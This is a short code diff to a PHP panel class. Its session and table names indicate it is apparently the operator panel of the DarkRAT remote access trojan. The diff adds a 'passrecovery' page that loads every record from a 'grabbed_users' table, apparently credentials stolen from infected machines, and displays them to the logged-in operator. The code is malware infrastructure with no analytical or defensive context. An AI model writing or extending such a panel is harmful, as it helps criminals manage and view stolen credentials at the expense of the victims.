@@ -316,4 +316,16 @@ class Main{
             $row["ram"] = $this->formatBytes($row["ram"]);
             $GLOBALS["tpl"]->assign("botinfo",$row);
         }
+
+        public function passrecovery(){
+            if(empty($_SESSION["darkrat_userid"])) {
+                die("Login Required");
+            }
+
+            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_users");
+            $result = $statement->execute(array());
+            $rows = $statement->fetchAll(PDO::FETCH_ASSOC);
+
+            $GLOBALS["tpl"]->assign("allusers",$rows);
+        }
 }
